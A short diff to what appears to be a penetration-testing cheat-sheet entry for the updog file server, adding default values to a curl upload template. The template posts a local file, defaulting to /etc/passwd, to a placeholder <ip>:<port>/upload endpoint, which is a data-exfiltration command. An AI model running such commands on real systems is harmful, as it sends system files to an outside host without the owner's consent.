@@ -14,7 +14,7 @@ updog -d $(pwd) -p <lport|9090> [--ssl]
 ## updog - curl upload to (http)
 For secured by password use http://:<password>@<ip>:<port>/upload
 ```
-curl -XPOST -F "file=@<file|/etc/passwd>;filename=<filename>" -F "path=<path>" http://<ip>:<port|9090>/upload
+curl -XPOST -F "file=@<file|/etc/passwd>;filename=<filename|passwd>" -F "path=<path|.>" http://<ip>:<port|9090>/upload
 ```
 
 ## updog - curl upload to (https)
